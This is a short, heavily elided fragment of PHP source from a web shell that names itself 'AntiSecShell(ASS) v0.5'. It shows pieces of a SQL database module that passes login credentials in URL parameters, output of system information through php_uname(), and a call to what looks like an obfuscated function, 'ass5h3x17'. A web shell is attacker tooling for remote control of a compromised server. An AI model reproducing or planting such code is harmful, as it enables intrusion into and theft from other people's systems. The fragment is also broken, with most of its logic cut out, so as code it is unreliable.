...
if ($antisec == "sql") {
  ...
  if (!$sql_sock) {
    ...
    if (!empty($sql_db)) {
      ?><?php echo $surl."antisec=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?><?php
...
?><?php echo wordwrap(php_uname()); ?><?php echo $wdt; ?><?php /* AntiSecShell(ASS) v0.5 */ ?><?php echo $dispd; ?><?php
    ...
    ?><?php echo htmlspecialchars($arg1); ?><?php echo htmlspecialchars($arg2); ?><?php echo $s_mu."ass.txt"; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo round(gmt()-starttime,4); ?><?php chdir($lastdirass); ass5h3x17(); ?>